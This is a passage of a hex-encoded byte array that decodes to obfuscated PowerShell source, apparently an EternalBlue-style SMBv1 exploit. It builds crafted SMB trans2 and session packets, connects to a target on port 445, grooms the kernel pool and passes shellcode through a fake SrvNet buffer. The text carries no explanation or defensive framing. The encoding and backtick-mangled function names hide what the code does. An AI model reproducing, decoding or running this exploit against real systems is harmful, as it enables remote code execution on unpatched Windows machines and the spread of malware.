,32 ,'5d',20 , '3d',20 , 24 ,68,65 ,78 ,'6c' ,65 ,'6e', '5b' ,31 ,'5d','d' , 'a' ,20 , 20,20 , 20,24 , 70,'6b' ,74 ,'5b', 33 ,'5d', 20, '3d' ,20, 24 , 68 , 65, 78 ,'6c', 65,'6e' ,'5b' ,32 ,'5d','d','a' ,20, 20 , 20 ,20,72 ,65,74,75 , 72 ,'6e', 20 ,24 ,70 ,'6b', 74 ,'d' , 'a' ,'7d', 'd','a', 'd' ,'a' ,66,75, '6e', 63 ,74, 69,'6f', '6e' , 20 ,73, 65, '6e' ,64, '5f',62, 69 , 67,'5f' , 74,72, 61 , '6e' , 73 , 32 ,38 , 28, 24, 73 ,'6f', 63,'6b','2c', 20 ,24,73 , '6d' , 62 ,68, 65, 61,64 ,65, 72,'2c' , 20 , 24 ,64, 61 ,74 ,61, '2c', 20, 24, 66, 69, 72 ,73 ,74,44,61 ,74 , 61 ,46 , 72,61 , 67 , '6d', 65,'6e', 74, 53 ,69,'7a' , 65,'2c' , 20 ,24 , 73 , 65, '6e', 64, '4c',61, 73, 74, 43 , 68 ,75 , '6e', '6b',29,'7b' ,'d' , 'a' , 'd', 'a', 20 , 20,20,20 ,24,'6e',74, '5f' , 74 , 72, 61 , '6e' ,73 ,'5f',70, '6b',74 , 20 , '3d', 20,'6d',60 , 41,'4b',60, 65,'5f',53, 60,'4d', 60,42, 31,'5f','6e', 74,60,'5f', 74,52,41, 60 ,'4e' , 60, 53,'5f' ,70, 61 , 60,63,'6b',65 , 54,38 ,20,24, 73 , '6d' ,62 ,68 ,65, 61, 64 , 65,72, '2e' , 74, 72 ,65, 65 ,'5f',69 , 64 , 20 ,24, 73 ,'6d', 62, 68,65 , 61, 64 ,65,72, '2e' , 75, 73 , 65, 72,'5f' , 69,64,'d' , 'a' , 20 , 20 , 20, 20 , 24,73, '6f' , 63,'6b', '2e', 53 ,65, '6e' , 64,28,24 ,'6e',74 ,'5f', 74, 72 ,61,'6e', 73,'5f' , 70, '6b', 74 ,29 ,20 ,'7c' , 20 ,'4f' ,60, 55 ,54, '2d', 60 ,'4e' , 75, '6c' ,'6c' , 'd','a' ,'d' , 'a', 20 , 20 , 20, 20, 24 , 72, 61, 77, '2c' ,20, 24 ,74 ,72,61 , '6e' , 73 ,68 ,65 , 61 , 64 ,65,72 , 20 ,'3d' , 20, 53, '4d', 42, 31, '5f',67,65,60 , 54 , '5f', 52, 60 , 65 ,60 , 53, 60,70, '4f','6e' , 73,65, 38, 28 , 24 , 73,'6f' , 63 , '6b', 29,'d', 'a',20, 20, 20 ,20 , 69 , 66, 20 , 28, 21 ,28, 24, 74, 72,61 ,'6e',73 , 68 , 65 ,61 ,64 , 65 ,72,'2e', 65 ,72 ,72 , '6f',72,'5f',63, '6c', 61 , 73, 73 ,20 , '2d', 65, 71 ,20 ,30 , 78, 30, 30,20,'2d',61,'6e', 64,20,28, 24, 74 ,72,61, '6e' ,73,68,65, 61 , 64,65,72 , '2e' ,72 ,65 ,73,65 , 72 , 76 ,65 ,64 , 31 ,20, '2d',65,71 , 20, 30 , 78 ,30, 30 , 29, 20,'2d' , 61 ,'6e' ,64, 20 ,28 , 24 , 74 , 72 , 61, '6e',73,68, 65, 61 , 64,65 ,72,'2e', 65 , 72, 72 , '6f' ,72,'5f' , 63,'6f', 64 ,65 ,'5b' ,30 ,'5d',20,'2d' , 65,71, 20, 30, 78 ,30,30 , 29,20, '2d' , 61, '6e' ,64, 20,28 , 24 , 74,72, 61,'6e' ,73,68,65,61,64, 65 ,72,'2e', 65, 72, 72 ,'6f', 72,'5f',63 ,'6f' ,64,65 , '5b',31,'5d' ,20 ,'2d' , 65,71 , 20,30 , 78,30,30, 29 , 29, 29 ,'d', 'a', 20 , 20,20 , 20, '7b' ,'d' , 'a',20, 20, 20 ,20 , 72,65,74 ,75 ,72 ,'6e' , 20 ,'2d' ,31 ,'2c','2d' , 31,'d' ,'a' , 20,20,20,20 , '7d','d' , 'a', 'd' ,'a' ,20, 20 ,20, 20, 24,69, '3d', 24 ,66 , 69, 72, 73 ,74 ,44, 61 , 74, 61,46,72, 61 ,67 ,'6d',65,'6e', 74, 53 ,69 ,'7a',65,'d', 'a', 20 ,20 , 20, 20 , 24,74 ,69, '6d' , 65,'6f' ,75 , 74 ,'3d' ,30 , 'd', 'a',20, 20 , 20 , 20,77,68,69, '6c', 65 ,20, 28,24 , 69,20,'2d', '6c' , 74 ,20, 24 , 64 , 61, 74 ,61 , '2e' , 63, '6f',75 , '6e', 74 ,29 , 'd' , 'a' , 20 , 20,20,20 ,'7b', 'd' , 'a', 20,20,20,20 , 20 ,20,20 , 20 ,24 ,73,65 ,'6e', 64 , 53 ,69, '7a' ,65 , '3d', '5b' ,53 ,79 ,73 , 74 ,65 , '6d', '2e' , '4d' , 61, 74 , 68 , '5d' ,'3a', '3a' ,'4d', 69 , '6e',28 , 34,30, 39 ,36 ,'2c', 28, 24, 64, 61 ,74 , 61 ,'2e',63,'6f' ,75,'6e', 74,'2d' , 24 , 69 , 29 , 29, 'd', 'a' , 20, 20 ,20,20 , 20 , 20 ,20 , 20, 69, 66,20,28,28,24,64 , 61 , 74 , 61, '2e' ,63 , '6f' , 75 ,'6e',74, '2d',24,69, 29 , 20 ,'2d','6c',65 ,20,34 , 30, 39,36, 29 , '7b' ,'d','a',20, 20,20 ,20,20 ,20 ,20,20 , 20, 69, 66,20,28 , 21, 24 , 73,65 ,'6e' , 64 ,'4c' ,61 , 73 , 74 , 43, 68,75 ,'6e' , '6b', 29 ,'d', 'a', 20 ,20 ,20, 20 ,20 , 20,20,20 ,20, 20, 20 ,20 , '7b',20, 62 ,72 ,65 , 61 ,'6b' , 20, '7d' ,'d' , 'a',20, 20,20, 20 ,20, 20,20,20, 20, '7d', 'd', 'a',20, 20, 20, 20,20 , 20 ,20,20, 24 ,74,72 ,61,'6e' ,73 ,32 , '5f' , 70, '6b' ,74 ,20,'3d',20 ,'4d', 41,'4b' ,65, '5f' , 73,'4d',62, 31 , '5f' ,74 , 60,52,61, '4e' , 53 ,32, '5f',65 , 78 , 50 , 60 ,'6c',60,'6f',60,69 , 74 ,'5f' , 60 , 50 ,61, 63 , '6b', 45,74 , 38 ,20,24,73 ,'6d' ,62 ,68, 65 ,61, 64, 65,72 , '2e', 74,72 , 65 ,65 ,'5f',69, 64,20 , 24 , 73 , '6d', 62,68 , 65 , 61,64,65 , 72 ,'2e' , 75, 73 , 65 ,72, '5f',69 ,64, 20 , 24,64 , 61, 74 , 61 , '5b' , 24,69 ,'2e','2e' , 28 , 24,69 ,'2b',24, 73 , 65, '6e' , 64 ,53 ,69 ,'7a', 65,'2d', 31 , 29, '5d',20, 24,74, 69,'6d' , 65,'6f' , 75 , 74 , 'd','a', 20 , 20,20,20 ,20, 20, 20 ,20,24, 73, '6f' , 63 ,'6b','2e' ,53, 65, '6e' ,64, 28 ,24 ,74 , 72, 61 ,'6e', 73,32 ,'5f',70,'6b' ,74,29,20,'7c' , 20 ,'6f' ,60 ,55,60,54 , '2d', '6e', 75,'6c' ,'4c' , 'd' ,'a' , 20 ,20 ,20 ,20 , 20, 20,20 , 20 ,24,74 ,69, '6d' , 65 ,'6f',75,74, '2b' , '3d',31,'d', 'a' , 20, 20,20,20 ,20, 20, 20 , 20,24 ,69 ,20 , '2b', '3d' , 24 , 73, 65,'6e' ,64,53 , 69,'7a' , 65 ,'d','a' , 20 , 20,20 , 20 , '7d', 'd', 'a', 20 ,20 ,20,20, 69 , 66 , 20 , 28,24,73, 65 ,'6e', 64 , '4c' ,61,73 ,74,43 , 68 ,75 , '6e' ,'6b', 29, 'd','a' ,20, 20,20,20,'7b' , 73,'4d' ,60 ,42 , 31,'5f' , 60,67 ,65,74, '5f',60, 52 , 65,73 , 70 , '4f',60,'4e' ,73 , 45, 38,28 , 24, 73 ,'6f' ,63,'6b',29,20, '7d','d', 'a',20 , 20 , 20, 20,72 , 65,74 , 75 ,72,'6e' ,20 ,24,69, '2c',24, 74 , 69, '6d', 65 , '6f' ,75 ,74 , 'd', 'a' ,'7d' ,'d' , 'a' , 66 , 75, '6e',63,74,69,'6f','6e', 20, 63 ,72 ,65, 61, 74 ,65,53,65 ,73, 73,69,'6f', '6e',41,'6c' ,'6c','6f' ,63, '4e','6f' ,'6e' , 50, 61 , 67 , 65,64 , 38,28, 24,74 , 61,72, 67, 65 ,74,'2c',20 , 24, 73 , 69, '7a',65, 29 , 20 ,'7b' , 'd','a' , 20, 20 ,20,24 ,63 , '6c' , 69 , 65 ,'6e',74 ,20 ,'3d' ,20 ,'4e',60 ,65,57 , 60 ,'2d' ,'4f' ,60 ,42, '4a' , 65 , 63 , 54 , 20 ,53 ,79 , 73 ,74 , 65,'6d' , '2e' , '4e' , 65,74 , '2e' , 53, '6f' , 63 ,'6b',65 ,74, 73, '2e' ,54 , 63, 70 , 43 , '6c' , 69 ,65 ,'6e' ,74, 28,24 ,74,61 ,72 ,67 , 65 , 74, '2c' , 34 , 34 ,35,29, 'd','a' , 20, 20,20 , 24 ,73, '6f' , 63 ,'6b',20,'3d' ,20, 24, 63 , '6c' ,69,65 , '6e' ,74 , '2e' ,43, '6c', 69, 65,'6e' ,74 ,'d' ,'a' , 20 , 20 ,20, 43,'4c' ,69, 65 ,'4e' , 60 , 54 , '5f' ,'4e',45 ,60 , 47 ,'6f',54 , 60 , 69 ,61 , 74, 60, 65 , 38 ,20 ,24,73, '6f', 63, '6b' ,20 ,24 , 66 , 61 , '6c', 73 , 65 ,20,'7c',20, '4f' , 55,74, '2d', 60 , '4e' , 75 ,60 ,'6c' ,'6c' , 'd' , 'a',20 , 20,20 ,24 ,66, '6c' , 61 ,67,73,32, '3d', 31, 36,33 ,38,35,'d' ,'a' ,20,20, 20 ,69, 66,20,28, 24 ,73 , 69, '7a' , 65 ,20 , '2d', 67,65 , 20,30, 78 , 66,66 ,66,66, 29 ,'d' ,'a' ,20,20 ,20, '7b', 20,24, 72, 65 , 71 ,73, 69 ,'7a', 65, '3d',24,73,69,'7a' ,65, 20 ,'2f', 32,'7d', 'd' , 'a', 20 ,20,20 ,65 , '6c' ,73,65,'d', 'a' ,20 , 20,20,'7b','d', 'a' ,20 ,20,20 ,20 ,20 ,24 ,66 ,'6c', 61 , 67, 73, 32 , 20 , '3d' ,34 , 39 ,31 ,35, 33,'d' ,'a' , 20 ,20,20,20,20 ,24 ,72 , 65,71, 73,69, '7a',65, '3d',20, 24,73 ,69 , '7a' , 65, 'd','a', 20,20 ,20,'7d' ,'d' ,'a' , 'd','a' , 20, 20 ,20 ,20 , 24,61,'3d', '5b',62, 69 ,74, 63, '6f', '6e', 76 , 65,72,74, 65 , 72,'5d' ,'3a','3a',47 , 65,74,42 ,79 , 74,65,73,28 , 24 , 72,65,71 , 73 , 69,'7a' ,65,29,'d','a', 20,20,20 ,20 , 24 ,62 , '3d','5b' , 62,69 ,74 , 63,'6f' , '6e', 76 ,65 , 72 , 74 ,65 , 72 ,'5d', '3a', '3a',47, 65, 74 , 42,79, 74 ,65, 73, 28, 24,66 ,'6c' ,61 , 67 ,73, 32 ,29,'d' ,'a',20, 20 , 20, 20,24 , 70 ,'6b',74 , 20 , '3d', 20, 20,'4d',41,'6b',65 , '5f', 73, '4d' ,42, 31 ,'5f', 66, 52,65 ,45 , '5f' , 48 , 60 ,'6f', '4c', 60,45, '5f' , 60 ,73 ,65 , 60 ,73,60 , 73 , 49 , 60,'6f', '6e' ,'5f' , 70,61, 43 , 60, '6b', 60 , 65 ,54 , 38 , 20,28 ,24 , 62 , '5b' ,30, '5d', '2c',24, 62, '5b' , 31, '5d' , 29, 20, 28 , 30 , 78, 30 ,32,'2c' , 30,78 ,30 ,30 , 29,20,28, 24,61, '5b' , 30 , '5d' ,'2c' , 24 ,61 ,'5b' , 31, '5d' ,'2c' ,30 , 78, 30, 30 , '2c' , 30,78 , 30, 30 , '2c', 30,78,30, 30,29,'d' ,'a', 'd', 'a',20 ,20 ,20 ,20 ,24 ,73,'6f' ,63 , '6b','2e' ,53 ,65, '6e',64, 28 , 24,70,'6b' ,74,29,20 ,'7c',20, '4f', 60, 55,74, '2d', 60, '4e',75, '4c' ,'4c' ,'d', 'a' ,20,20 ,20 ,20,53,'6d', 62, 31 ,'5f' ,67,45,60 ,54 ,'5f' ,72 ,45 , 73 , 50, 60 , '4f', '4e' , 60 ,73, 65 , 38, 28,24, 73,'6f' ,63,'6b' ,29,20 , '7c', 20, '4f', 60 , 55 ,74,'2d','6e', 60, 55, '4c', '4c', 'd','a', 20 , 20 , 20 ,20,72, 65, 74 , 75 , 72 ,'6e',20 , 24,73 ,'6f', 63,'6b' , 'd' ,'a', '7d','d','a',66 ,75,'6e',63, 74,69 , '6f' , '6e',20 ,20 , '6d', 61 , '6b',65, '5f' ,73 , '6d' , 62, 31, '5f' , 66 , 72, 65,65,'5f' ,68,'6f','6c' ,65, '5f' , 73,65 , 73 , 73 ,69, '6f','6e' , '5f',70 ,61 , 63 , '6b' , 65, 74,38 ,28, 24,66 ,'6c' , 61 ,67 ,73 ,32 ,'2c', 20 , 24 , 76,63,'6e', 75,'6d', '2c',20, 24,'6e', 61 ,74, 69 , 76,65 ,'5f','6f' ,73,29 , 20 ,'7b' ,'d', 'a' , 'd' , 'a' , 20 , 20,20 ,20 ,'5b', 42,79 ,74, 65 ,'5b', '5d' ,'5d', 20 , 24, 70 , '6b' ,74,20,'3d' ,20 ,30,78,30 , 30, 'd','a' , 20, 20 , 20 ,20 ,24 , 70 , '6b' , 74,20 , '2b','3d' ,20,30,78, 30 ,30 ,'2c' , 30 , 78 , 30, 30 ,'2c', 30,78,35 ,31 , 'd', 'a',20 ,20,20 ,20, 24,70, '6b' ,74 , 20,'2b','3d' ,20 ,30, 78 , 66 ,66 ,'2c' , 30,78, 35 , 33 ,'2c', 30 ,78 ,34 , 44,'2c', 30, 78 ,34, 32,'d' , 'a' ,20, 20 ,20,20 ,24, 70 ,'6b',74, 20 ,'2b' , '3d' , 20 , 30, 78, 37,33,'d' , 'a',20 , 20 ,20, 20, 24,70 ,'6b' ,74,20, '2b' , '3d', 20,30 , 78,30,30 , '2c', 30,78,30, 30 ,'2c', 30,78, 30, 30 ,'2c',30 ,78 , 30 ,30 ,'d', 'a' , 20, 20 ,20,20,24,70, '6b' ,74,20 ,'2b' ,'3d' ,20, 30 , 78 , 31,38 , 'd' , 'a' , 20 , 20, 20 ,20, 24 , 70 ,'6b', 74 , 20 , '2b', '3d' ,20, 24,66,'6c',61 , 67 ,73, 32 , 'd' ,'a' ,20 , 20, 20,20,24 , 70,'6b' ,74 ,20,'2b','3d' , 20,30 , 78,30,30,'2c',30, 78, 30 ,30,'d', 'a',20 , 20 ,20, 20 ,24 ,70, '6b',74 ,20,'2b' ,'3d',20,30,78 ,30, 30 ,'2c', 30 , 78 ,30,30 , '2c',30 ,78 ,30, 30 , '2c',30,78 ,30,30, 'd' ,'a' ,20 ,20, 20, 20,24, 70,'6b' , 74,20 , '2b','3d',20, 30 , 78, 30 ,30,'2c', 30 , 78 ,30 , 30 , '2c' , 30 ,78,30 ,30 , '2c' , 30 , 78 ,30,30,'d','a' , 20, 20,20 ,20 , 24 , 70 ,'6b' ,74,20 , '2b' , '3d',20 , 30 ,78, 30 ,30 ,'2c',30,78 ,30 , 30,'d','a', 20 ,20 , 20, 20 , 24 , 70 ,'6b',74,20, '2b' , '3d' ,20 ,30 , 78, 66,66,'2c' , 30, 78 , 66, 66,'d','a' ,20,20, 20,20, 24,70, '6b',74 , 20,'2b', '3d',20 , 30 , 78 , 32, 66,'2c',30 ,78,34, 62, 'd' , 'a' , 20,20,20 , 20 , 24 ,70,'6b' ,74, 20, '2b' , '3d',20, 30,78 ,30 , 30,'2c' ,30,78, 30, 30 , 'd','a', 20 , 20 , 20 ,20 , 24 , 70 , '6b' , 74,20 ,'2b', '3d', 20 , 30,78 , 30 , 30,'2c',30 ,78,30 ,30 ,'d' ,'a',20,20 , 20 ,20 ,24, 70 ,'6b' ,74 , 20,'2b' ,'3d' , 20, 30 , 78, 30, 63 ,'d' , 'a' ,20,20, 20,20, 24 ,70, '6b', 74 , 20, '2b','3d',20, 30 , 78, 66 , 66,'d' ,'a',20 , 20 ,20 ,20 , 24,70,'6b', 74,20 ,'2b','3d' ,20 , 30 ,78, 30 ,30,'d', 'a' , 20 ,20,20 , 20 ,24, 70 ,'6b',74 , 20,'2b' ,'3d' ,20 ,30 ,78 , 30,30,'2c' ,30 ,78 ,30, 30 ,'d','a' , 20 , 20, 20 , 20 , 24 ,70,'6b' ,74 ,20, '2b', '3d', 20,30 , 78 , 30,30 , '2c' ,30 , 78, 66 , 30, 'd' ,'a' ,20 ,20 , 20 , 20, 24, 70 , '6b',74 ,20 ,'2b' ,'3d' , 20 ,30 ,78 , 30 ,32,'2c', 30, 78,30,30 ,'d', 'a',20, 20 , 20 ,20,24,70,'6b' ,74,20 , '2b' ,'3d' ,20 , 24, 76 , 63, '6e',75 ,'6d','d','a', 20, 20, 20, 20 ,24,70, '6b' , 74 , 20,'2b' , '3d', 20,30 , 78,30, 30,'2c', 30,78, 30 , 30 , '2c' , 30 , 78, 30, 30, '2c' ,30, 78, 30,30 , 'd' , 'a',20,20,20 ,20,24, 70,'6b' , 74 ,20,'2b', '3d' , 20 , 30, 78 ,30 ,30, '2c' ,30 , 78, 30 ,30 ,'d','a', 20,20, 20, 20 ,24,70,'6b', 74 ,20 , '2b', '3d' ,20, 30,78,30,30,'2c',30,78 ,30, 30 ,'2c', 30 ,78 ,30 ,30,'2c' ,30, 78,30 ,30,'d','a',20,20,20 ,20, 24, 70,'6b' , 74 , 20 ,'2b', '3d' ,20 , 30 , 78,34,30,'2c',30, 78,30,30 ,'2c' ,30, 78, 30, 30, '2c' ,30,78, 38 , 30, 'd','a',20, 20 , 20 ,20, 24,70,'6b' , 74, 20, '2b', '3d', 20,30 ,78 , 31, 36 , '2c' , 30,78, 30 ,30,'d','a',20 ,20 ,20 , 20,24 ,70 ,'6b' , 74,20 ,'2b','3d' , 20, 24, '6e', 61,74, 69, 76,65 , '5f' , '6f' ,73 ,'d','a', 20 , 20 , 20,20, 24, 70,'6b',74 ,20, '2b', '3d' ,20 , '5b' ,42,79,74 ,65,'5b','5d', '5d' ,20,28 ,30,78, 30 ,30 , 29, 20, '2a' , 20 , 31 , 37,'d','a' , 20 , 20 ,20 ,20, 72 ,65, 74 , 75, 72 , '6e' ,20 ,24,70, '6b' ,74 ,'d' , 'a',20,20 , '7d' , 'd' ,'a' , 'd','a',66, 75, '6e',63 , 74,69 ,'6f' , '6e' , 20 ,'6d', 61, '6b',65, '5f' , 73 , '6d', 62 ,32,'5f' ,70,61, 79 ,'6c' , '6f' ,61 ,64 , '5f',68,65 , 61 , 64, 65,72,73 , '5f' , 70 , 61, 63 , '6b',65 ,74 ,38 ,28 ,24, 66 , '6f', 72 , '5f', '6e' ,78 ,29 ,'7b','d','a' ,20 ,20,20 ,20, '5b',42, 79,74,65, '5b' , '5d', '5d', 20 , 24 ,70, '6b',74 , 20 ,'3d', 20 , '5b' ,42, 79 ,74 ,65 ,'5b' ,'5d', '5d' ,28 , 30,78, 30,30,'2c' ,30 , 78, 30 ,30, '2c',30,78 , 38 , 31,'2c' ,30,78, 30 , 30 , 29, 20, '2b', 20 ,'5b', 73, 79 , 73 , 74 , 65, '6d' , '2e' ,54, 65 , 78, 74 ,'2e' ,45 , '6e', 63 , '6f' ,64, 69, '6e', 67,'5d', '3a', '3a',41,53,43, 49, 49 ,'2e' ,47, 65, 74 ,42, 79, 74 , 65 ,73,28, 28 , 27,42 , 41, 27 ,'2b', 27 , 41 ,44,27,29 ,29 ,'d','a' ,20, 20 , 20,20,69 , 66,20,28 ,24 ,66 ,'6f' ,72, '5f' ,'6e' , 78,29 ,'7b',20, 24, 70, '6b',74, '2b' , '3d' ,'5b' , 42,79 ,74,65,'5b' , '5d' , '5d', 28,30 ,78,30,30,29 ,'2a' ,31, 32 ,33 ,20, '7d' , 'd' , 'a', 20 , 20 , 20,20,65 , '6c' , 73 , 65,'7b',20 , 24 ,70,'6b',74,'2b' ,'3d', '5b',42,79 , 74,65,'5b','5d','5d' ,28 ,30 , 78, 30 , 30 , 29 ,'2a' , 31, 32, 34 , 20 , 20 , '7d' ,'d','a' , 20 , 20, 20 ,20, 72 ,65 , 74 ,75 ,72, '6e', 20 ,24 , 70 ,'6b' , 74 , 'd' ,'a' , '7d', 'd' ,'a' ,'d', 'a' , 'd','a', 66 ,75, '6e',63, 74,69,'6f' ,'6e',20, 65 ,62 ,38 , 28,24 , 74 , 61 , 72, 67, 65,74, '2c', 24,73, 63 , 29,20,'7b' ,'d' ,'a' ,20, 20,20 , 20, 24, '4e' , 54,46 ,45 , 41,'5f', 53, 49,'5a', 45 ,38,20 ,'3d' ,20 ,30, 78 , 39 , 30,30,30,'d' , 'a', 9 , 24,'6e' ,74 , 66, 65, 61 , 39, 30, 30,30, '3d' , '5b' ,62 , 79, 74 ,65 ,'5b' , '5d' , '5d',30,78, 30 ,30,'2a', 30 , 78 ,62, 65 ,30,'d','a' , 9, 24,'6e', 74 , 66, 65 ,61,39 , 30, 30,30, 20 , '2b', '3d' ,30, 78 , 30 ,30 , '2c' , 30 , 78, 30, 30, '2c' ,30,78,35, 63,'2c' ,30, 78 , 37,33,'2b', '5b', 62 , 79, 74,65 , '5b' , '5d', '5d' ,30 ,78 , 30 , 30,'2a' ,30, 78,37,33 ,35 , 64, 'd' ,'a' , 9, 24,'6e',74 ,66 ,65 , 61,39 , 30 , 30,30 , 20, '2b' ,'3d',30, 78 , 30 , 30 ,'2c',30, 78, 30, 30 , '2c',30 ,78, 34 ,37, '2c',30 , 78,38, 31,'2b', '5b' ,62,79, 74 ,65, '5b', '5d', '5d' , 30,78 , 30 , 30,'2a' , 30 , 78 , 38 , 31, 34, 38 ,'d' ,'a','d', 'a' ,'d', 'a', 20, 20 , 20 ,20 ,24,54 ,41 , 52,47,45 , 54 ,'5f', 48,41, '4c','5f',48 , 45 ,41 , 50, '5f', 41 , 44 ,44 ,52, 20 , '3d', 20, 30 ,78,66 , 66,66, 66,66, 66 , 66 , 66 ,66,66 , 64 , 30 , 34 ,30 , 30 ,30 ,'d' ,'a' ,20 ,20 , 20 , 20 , 24 , 53, 48,45 ,'4c','4c',43,'4f', 44 , 45 ,'5f' ,50,41 , 47 , 45, '5f', 41 ,44,44 , 52 ,20 ,'3d' , 20 ,20 ,30,78 ,66, 66 , 66 , 66 ,66 ,66,66,66,66, 66 ,64 ,30,34 ,30, 30, 30, 'd', 'a',20,20 , 20 ,20 ,24,50, 54, 45,'5f', 41, 44 , 44,52,'3d' , 30,78, 66,66,66 ,66 , 66 , 36 , 66,66 ,66,66 , 66, 66 ,65, 38 , 32 , 30, 'd' ,'a','d', 'a' ,20 ,20, 20 , 20, 24, 66 ,61, '6b' ,65, 53,72 , 76 , '4e' , 65 ,74, 42 , 75 ,66 ,66, 65 , 72,58 ,36 ,34 ,'4e', 78, 20 , '3d',40 , 28, 30, 78 ,30,30, '2c' , 30 , 78 , 30 , 30 , '2c',30 ,78 ,30 , 30, '2c',30, 78 ,30,30 , '2c' , 30 , 78, 30, 30,'2c' ,30 , 78,30 , 30, '2c',30 ,78, 30 , 30,'2c' , 30 , 78 ,30,30 ,'2c', 30, 78 , 30, 30, '2c' ,30,78 , 30 , 30, '2c' , 30 , 78, 30, 30 ,'2c' ,30,78 ,30 , 30 , '2c' ,30 ,78,30, 30,'2c', 30,78 , 30,30, '2c', 30 ,78, 30 , 30 ,'2c' , 30, 78,30, 30 ,'2c' , 30,78 ,66 ,30 , '2c' , 30, 78 , 66 ,66 ,'2c',30,78 , 30,30 , '2c' , 30, 78 , 30 , 30 , '2c',30,78,30 ,30 , '2c' , 30, 78, 30, 30, '2c', 30,78 ,30,30 ,'2c', 30 , 78 , 30, 30,'2c', 30 , 78,30 ,30, '2c', 30,78 , 34 ,30 , '2c' ,30, 78, 64,30,'2c', 30 , 78 ,66, 66 ,'2c',30 , 78, 66,66 ,'2c' , 30, 78, 66, 66, '2c',30, 78, 66 , 66, '2c' ,30,78, 66 , 66,'2c',30, 78, 30,30 , '2c',30,78, 30 , 30 , '2c', 30, 78 , 30 ,30, '2c' ,30 ,78,30 ,30 , '2c',30 , 78, 30, 30 ,'2c',30, 78, 30, 30 , '2c', 30 ,78 ,30 , 30 ,'2c' ,30,78 , 30,30,'2c' , 30 ,78 , 30 ,30, '2c' , 30 ,78 , 30, 30, '2c' ,30 ,78 , 30 , 30, '2c',30, 78, 30 , 30,'2c', 30,78 , 30 ,30 ,'2c',30 ,78,30, 30 ,'2c' ,30,78 , 30 , 30 , '2c' , 30 , 78 ,30, 30, '2c',30, 78 ,30,30 , '2c',30, 78, 30 ,30 ,'2c',30 , 78 , 30,30,'2c' , 30 , 78 , 30 , 30 ,'2c' , 30 , 78 , 30,30, '2c',30, 78,30 , 30 , '2c' ,30 ,78 , 30 ,30, '2c' ,30 , 78 , 30 ,30 , '2c' , 30 , 78 , 30 , 30, '2c',30 ,78 , 30, 30,'2c',30 , 78 ,30 , 30 , '2c',30 ,78,30 ,30, '2c', 30,78 , 30 , 30, '2c', 30 ,78 , 30 ,30, '2c',30 , 78,30, 30, '2c' ,30,78, 30,30 ,'2c' , 30 ,78,30, 30, '2c',30,78 , 30 , 30 , '2c' ,30,78 ,30 ,30 , '2c',30 , 78,30 ,30,'2c', 30, 78 ,30,30 , '2c',30,78,30, 30, '2c' , 30, 78,30,30 ,'2c',30 ,78,30, 30, '2c', 30, 78, 30, 30, '2c' , 30,78,30, 30,'2c',30 ,78 , 30,30 ,'2c' ,30 ,78 ,30 ,30, '2c', 30 ,78, 30 ,30 , '2c' ,30, 78 , 30 ,30,'2c' ,30 , 78 , 30 , 30, '2c' , 30 ,78 , 30, 30, '2c', 30, 78, 30 , 30, '2c' , 30 , 78 , 30 ,30, '2c' , 30 ,78 , 30 ,30 , '2c' ,30 ,78 , 30 ,30 ,'2c', 30,78, 30 ,30, '2c', 30 ,78 ,30,30 ,'2c',30 ,78, 30,30 ,'2c',30,78 ,30 , 30 , '2c', 30 ,78,30 ,30, '2c' ,30, 78, 34 , 30 , '2c' ,30, 78 ,64,30,'2c',30,78, 66, 66 ,'2c' , 30 , 78,66 ,66,'2c', 30, 78 ,66, 66 , '2c' ,30, 78,66 , 66,'2c',30, 78 , 66, 66,'2c' ,30 ,78 ,30 , 30,'2c' ,30, 78,30 , 30,'2c' ,30 ,78, 30,30,'2c', 30, 78 , 30 ,30, '2c',30 , 78 ,30,30 , '2c', 30, 78, 30,30,'2c', 30 ,78 ,30 ,30,'2c' ,30 , 78, 30, 30 , '2c' ,30 ,78, 30 ,30 , '2c' , 30, 78, 30 , 30,'2c',30 , 78,30 ,30,'2c' , 30, 78,30 , 30,'2c' , 30, 78, 30 ,30 , '2c', 30, 78, 30 ,30 , '2c' ,30,78 ,30 ,30 ,'2c' ,30 ,78 ,30,30 , '2c',30, 78 ,30 ,30 ,'2c' , 30,78, 30 ,30 , '2c' , 30 ,78,30 , 30,'2c' ,30, 78,30, 30,'2c' , 30,78,30,30,'2c',30,78 , 30 , 30 ,'2c' ,30, 78, 30 ,30, '2c', 30,78,30 ,30, '2c' , 30, 78, 30, 30,'2c' ,30,78 ,30 , 30, '2c' ,30 , 78,30 ,30,'2c' , 30 ,78,30 ,30 , '2c', 30,78, 30,30 ,'2c', 30 , 78, 30, 30 ,'2c' ,30,78 ,30 ,30 ,'2c' , 30 , 78 ,30 ,30,'2c' ,30 , 78, 30,30,'2c' ,30 , 78,30, 30,'2c', 30 ,78, 30,30 ,'2c' ,30 ,78 , 30 , 30, '2c' , 30 , 78 , 30, 30, '2c' , 30, 78,30 ,30, '2c', 30 , 78,30 , 30 ,'2c' ,30, 78,30,30 , '2c',30 ,78,30 ,30 ,'2c' , 30 , 78 , 30,30 , '2c' ,30 ,78 ,30,30,'2c' ,30,78 ,30 , 30 , '2c', 30,78 , 30 ,30,'2c' , 30 ,78, 30 ,30 ,'2c',30,78,30, 30,'2c' ,30 , 78,30 ,30 ,'2c' ,30, 78, 30, 30 , '2c' ,30, 78 , 30,30 , '2c', 30, 78,30,30,'2c',30 , 78 , 30 ,30,'2c' , 30 ,78 , 30 , 30 , '2c' ,30 ,78 ,30, 30,'2c',30,78, 30, 30 ,'2c', 30 ,78,30,30 ,'2c' ,30 ,78 , 36, 30 , '2c' , 30,78,30 ,30 , '2c' , 30, 78, 30, 34,'2c' , 30,78,31,30, '2c' , 30 , 78 ,30, 30 , '2c',30 ,78 ,30 , 30, '2c' , 30,78,30 , 30 , '2c', 30 ,78 , 30, 30, '2c',30 ,78, 30 ,30, '2c',30,78 , 30 ,30, '2c' , 30, 78,30, 30, '2c',30 ,78, 30,30,'2c', 30 ,78 ,30 ,30,'2c' , 30 ,78,30, 30,'2c' , 30 , 78,30 , 30,'2c', 30, 78, 30, 30 ,'2c' ,30 , 78 , 61, 38, '2c' , 30 , 78,65 , 37,'2c' ,30 , 78 , 66,66,'2c',30 ,78,66 , 66 , '2c', 30 ,78, 66, 66 , '2c',30 ,78 , 66, 36 ,'2c',30 , 78 ,66 ,66, '2c' , 30, 78,66,66, 29, 'd', 'a' , 'd', 'a', 20,20, 20 ,20 ,'5b' , 62 ,79,74,65,'5b' , '5d' ,'5d', 24,66 , 65,61, '4c' , 69 ,73 , 74 , '4e' ,78 ,'3d' , '5b' , 62 , 79 ,74,65 ,'5b', '5d' , '5d' , 28, 30 ,78 ,30,30 , '2c',30,78 ,30, 30 ,'2c', 30 ,78 ,30 , 31,'2c' , 30 , 78 , 30 , 30, 29 , 'd' , 'a' ,20, 20 